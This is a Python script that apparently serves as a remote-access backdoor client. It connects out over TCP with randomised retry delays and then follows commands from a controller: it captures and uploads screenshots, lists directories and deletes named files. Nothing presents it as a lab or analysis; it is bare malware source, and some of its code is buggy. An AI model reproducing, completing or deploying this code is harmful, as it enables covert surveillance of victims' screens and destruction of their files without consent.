import socket
import time
import random
import os
import pyautogui

lHost = ""
port = 80

def send(msg):
    s.send(msg.encode("UTF-8"))

def getInstructions():
    while True:
        msg = s.recv(4096)
        inst = msg.decode("UTF-8")
        if inst == "test":
            try:
                send("[RECEIVING]")
            except:
                pass
        elif inst == "ss":
            pic = pyautogui.screenshot()
            pic.save('Screenshot.png')
            f_send = "Screenshot.png"
            print('Screenshot captured.')
            with open(f_send, "rb") as f:
                print('Sending file...')
                data = f.read()
                s.sendall(data)
        elif inst == "listdir":
            path = s.recv(1024).decode()
            contents = os.listdir(path)
            s.send((contents + "").encode())
        elif inst == "deletefile":
            file = s.recv(1024).decode()
            try:
                os.remove(file)
            except:
                failMsg = "Failed to delete file"
                s.send(failMsg.encode())
            s.send(("File deleted").encode())
        else:
            pass

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
connected = False
while connected == False:
    try:
        s.connect((host, port))
        connected = True
    except:
        sleepTime = random.randint(20, 30)
        time.sleep(sleepTime)
getInstructions()
